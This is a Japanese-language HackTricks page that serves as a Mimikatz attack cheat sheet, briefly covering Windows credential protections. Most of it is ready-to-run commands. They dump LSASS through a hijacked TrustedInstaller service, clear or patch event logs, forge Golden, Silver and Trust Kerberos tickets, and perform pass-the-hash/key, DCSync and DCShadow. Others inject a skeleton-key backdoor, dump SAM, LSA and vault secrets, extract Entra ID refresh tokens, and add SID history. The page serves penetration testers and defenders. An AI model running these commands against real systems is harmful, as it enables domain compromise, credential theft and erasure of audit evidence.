# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**このページは [adsecurity.org](https://adsecurity.org/?page_id=1821) のページをもとにしています**。詳細については元のページを確認してください！<sup>[[3]](#references)</sup>

## メモリ内の LM と Clear-Text

Windows 8.1 および Windows Server 2012 R2 以降では、認証情報の窃取を防ぐための重要な対策が実装されています。

- **LM ハッシュとプレーンテキストのパスワード**は、セキュリティ強化のためメモリに保存されなくなりました。Digest Authentication を無効にし、LSASS に「clear-text」パスワードがキャッシュされないようにするには、特定のレジストリ設定 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定する必要があります。

- **LSA Protection** は、Local Security Authority (LSA) プロセスを不正なメモリ読み取りやコードインジェクションから保護するために導入されました。これは、LSASS を保護されたプロセスとして指定することで実現します。LSA Protection を有効にする手順は次のとおりです。
  1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ のレジストリを変更し、`RunAsPPL` を `dword:00000001` に設定します。
  2. このレジストリ変更を管理対象デバイス全体に適用する Group Policy Object (GPO) を設定します。

こうした保護策があっても、Mimikatz などのツールは特定のドライバーを使って LSA Protection を回避できます。ただし、こうした操作はイベントログに記録される可能性があります。

最新のワークステーションでは、**Credential Guard が Windows 11 22H2 以降および Windows Server 2025 のドメイン参加済み非 DC システムの多くでデフォルトで有効**になり、**新規インストールした Windows 11 22H2 以降では LSASS-as-PPL がデフォルトで有効**になるため、この点はさらに重要です。実際には、`sekurlsa::logonpasswords` で得られる情報は、従来の手法で想定されていたものより少ないことが多く、オペレーターは **オフライン minidump**、**Kerberos key extraction (`sekurlsa::ekeys`)**、または **CloudAP/PRT 向けモジュール**に移行するケースが増えています。保護策については、[Windows credentials protections](credentials-protections.md) を確認してください。

### SeDebugPrivilege の削除への対処

通常、管理者には SeDebugPrivilege が付与されており、プログラムをデバッグできます。この特権を制限すれば、不正なメモリダンプを防げます。メモリダンプは、攻撃者がメモリから認証情報を抽出する際によく使う手法です。しかし、この特権が削除されていても、TrustedInstaller アカウントはサービス設定をカスタマイズすることで、引き続きメモリダンプを実行できます。

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

これにより、`lsass.exe` のメモリをファイルにダンプし、そのファイルを別のシステムで解析して認証情報を抽出できます：

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatzのオプション

Mimikatzでイベントログを改ざんするには、主にイベントログの消去と、新しいイベントが記録されないようにEventサービスへパッチを適用する方法があります。以下に、これらの操作を実行するコマンドを示します。

#### イベントログの消去

Mimikatzには`event::clear`があります。これは、選択したクラシックログに対してWindowsのイベントログ消去APIを呼び出します。デフォルトは`Security`です。`/log:`で別のログを指定でき、実行者にはそのログを消去する権限が必要です。これは、新しいレコードの書き込みを停止しようとする`event::drop`とは異なります。<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Experimental Feature: Event Service のパッチ適用

- **コマンド**: `event::drop`
- この実験的なコマンドは、Event Logging Service の動作を変更し、新しいイベントが記録されないようにすることを目的としています。
- 例: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` コマンドは、Mimikatz がシステムサービスを変更するために必要な権限で動作するようにします。
- その後、`event::drop` コマンドが Event Logging Service にパッチを適用します。

### Kerberos Ticket 攻撃

以下のコマンドは、構文を手早く確認するためのものです。[Golden Ticket](../active-directory-methodology/golden-ticket.md)、[Silver Ticket](../active-directory-methodology/silver-ticket.md)、[Diamond Ticket](../active-directory-methodology/diamond-ticket.md)、[over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) の専用ページには、最新の AES/PAC/opsec に関する詳細が記載されています。

### Golden Ticket の作成

Golden Ticket を使うと、ドメイン全体へのアクセスを偽装できます。主なコマンドとパラメーター:

- コマンド: `kerberos::golden`
- パラメーター:
  - `/domain`: ドメイン名。
  - `/sid`: ドメインの Security Identifier (SID)。
  - `/user`: 偽装するユーザー名。
  - `/krbtgt`: ドメインの KDC サービスアカウントの NTLM hash。
  - `/ptt`: Ticket をメモリに直接注入します。
  - `/ticket`: Ticket を後で使えるように保存します。

例:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Creation

Silver Ticketは特定のサービスへのアクセスを許可します。主なコマンドとパラメーター:

- コマンド: Golden Ticketと同様ですが、特定のサービスを対象とします。
- パラメーター:
  - `/service`: 対象とするサービス（例: cifs、http）。
  - その他のパラメーターはGolden Ticketと同様です。

例:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket Creation

Trust Ticketは、信頼関係を利用してドメイン間のリソースにアクセスするために使用されます。主なコマンドとパラメーター:

- Command: Golden Ticketと似ていますが、信頼関係向けです。
- Parameters:
  - `/target`: 対象ドメインのFQDN。
  - `/rc4`: 信頼アカウントのNTLM hash。

Example:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### 追加の Kerberos コマンド

- **チケットの一覧表示**:

  - コマンド: `kerberos::list`
  - 現在のユーザーセッションの Kerberos チケットをすべて一覧表示します。

- **Pass the Cache**: `kerberos::ptc` は MIT/Heimdal の `.ccache` ファイルを読み込みます。`.kirbi` ファイルは読み込みません。ファイルパスを位置引数として指定します: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` は `.kirbi` ファイル、またはそのようなファイルが格納されたディレクトリを読み込みます。また、`/ticket:` ではなく、パスを位置引数として指定します: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`。一連の手順については、[Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) を参照してください。<sup>[[6]](#references)</sup>

- **チケットの削除**:
  - コマンド: `kerberos::purge`
  - セッションからすべての Kerberos チケットを削除します。
  - チケット操作コマンドを使用する前に実行すると、競合を避けるのに役立ちます。

### Over-Pass-the-Hash / Pass-the-Key

`RC4` が無効化されている、または信頼性に欠ける場合、Mimikatz は NT hash だけを使用する代わりに、**AES128/AES256 Kerberos key** を現在のログオンセッションにパッチできます。`sekurlsa::pth` を NTLM 専用として扱うよりも、一般に最新のドメインに適した方法です。<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` は新しいコンソールを起動せず、現在のプロセスを再利用します。同じコンテキストで `lsadump::dcsync` などをすぐに実行したい場合に便利です。

### Active Directory の改ざん

- **DCShadow**: マシンを一時的に DC として動作させ、AD オブジェクトを操作します。[DCShadow](../active-directory-methodology/dcshadow.md) を参照してください。

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DC を模倣してパスワードデータを要求します。[DCSync](../active-directory-methodology/dcsync.md) を参照してください。
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 認証情報へのアクセス

- **LSADUMP::LSA**: LSA から認証情報を抽出します。

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: コンピューターアカウントのパスワードデータを使用して DC を偽装します。

  - _元のコンテキストには NetSync 用の具体的なコマンドは記載されていません。_

- **LSADUMP::SAM**: ローカル SAM データベースにアクセスします。

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: レジストリに保存されたシークレットを復号します。

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: ユーザーの新しい NTLM hash を設定します。

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 信頼関係の認証情報を取得します。
  - `mimikatz "lsadump::trust" exit`

### Cloud の認証情報 / Entra ID

**Entra ID** または **hybrid-joined** のホストでは、`sekurlsa::cloudap` により LSASS からキャッシュされた **Primary Refresh Token (PRT)** の情報を取得できる場合があります。`ProofOfPossesionKey.KeyValue` は DPAPI で保護されたセッションキーの blob であり、すでに復号されたキーではありません。<sup>[[7]](#references)[[8]](#references)</sup> `/unprotect` を使用するには、`SYSTEM` として `dpapi::cloudapkd` を実行するか（たとえば、昇格した Mimikatz セッションから `token::elevate` を実行）、先に `sekurlsa::dpapi` で Mimikatz の key cache にデータを格納してください。`privilege::debug` だけでは、DPAPI の呼び出し元コンテキストは切り替わりません。<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

最初のコマンドの **一致する** `Context` と `Derived Key` を2つ目のコマンドにコピーしてください。指定しない場合、Mimikatzは新しいcontextを生成します。TPMで保護されたキーでも、Mimikatzは元のデバイス上でTPMを使用して署名キーを導出できる場合があります。クリアキーをエクスポートする必要はありませんが、導出キーの取得に成功すれば、ブラウザーのcookieに署名できます。<sup>[[7]](#references)</sup>

PRTの文字列だけでは不十分です。Microsoft Entraでは、関連付けられたセッションキーを所有していることの証明が必要です。<sup>[[9]](#references)</sup> その他のmaster keyの選択肢については[DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md)を、クラウド側の手順については[Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)を参照してください。

### その他

- **MISC::Skeleton**: DC上のLSASSにバックドアを注入します。
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### 特権昇格

- **PRIVILEGE::Backup**: バックアップ権限を取得します。

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: デバッグ権限を取得します。
  - `mimikatz "privilege::debug" exit`

### 認証情報のダンプ

- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの認証情報を表示します。

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
  - `mimikatz "sekurlsa::tickets /export" exit`

### SIDとトークンの操作

- **SID::add/modify**: SIDとSIDHistoryを変更します。

  - 追加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - 変更: _元の文脈では、変更用の具体的なコマンドはありません。_

- **TOKEN::Elevate**: トークンを偽装します。
  - `mimikatz "token::elevate /domainadmin" exit`

### ターミナルサービス

- **TS::MultiRDP**: 複数のRDPセッションを許可します。

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDPセッションを一覧表示します。
  - _TS::Sessions用の具体的なコマンドは提示されていません。_

### Vault

- Windows Vaultからパスワードを抽出します。
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFBとEntra ID: 新しいキャッシュフローの登場](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatzコマンドリファレンス](https://adsecurity.org/?page_id=1821)
- [4] [Mimikatz event moduleのソースコード](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Mimikatz ccache moduleのソースコード](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Mimikatz Kerberos moduleのソースコード](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz CloudAP DPAPIの実装](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Primary Refresh Tokenをさらに掘り下げる](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Microsoft Entra Primary Refresh Tokenの保護](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
